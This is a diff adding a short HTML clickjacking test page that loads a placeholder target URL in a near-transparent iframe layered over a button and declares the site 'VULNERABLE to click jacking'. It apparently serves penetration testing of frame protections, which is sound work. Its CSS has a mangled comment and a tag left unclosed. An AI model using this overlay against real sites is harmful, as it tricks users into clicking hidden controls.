@@ -1,0 +1,30 @@
+<html>
+<head>
+<title>Clickjack test page</title>
+<style>
+iframe {
+width: 900px;
+height: 800px;
+/* Use absolute positioning to line up update button with fake button /
+position: absolute;
+top: 100px;
+left: 100px;
+z-index: 2;
+/ Hide from view */
+-moz-opacity: 0.2;
+opacity: 0.2;
+filter: alpha(opacity=0.2);
+}
+button {
+position: absolute;
+top: 330px;
+left: 100px;
+z-index: 1;
+width: 65px;
+}
+</style>
+</head
+<body>
+<p>website is VULNERABLE to click jacking!</p>
+<iframe src="Put_Here_URL" height="700" width="1000"></iframe>
+</body>
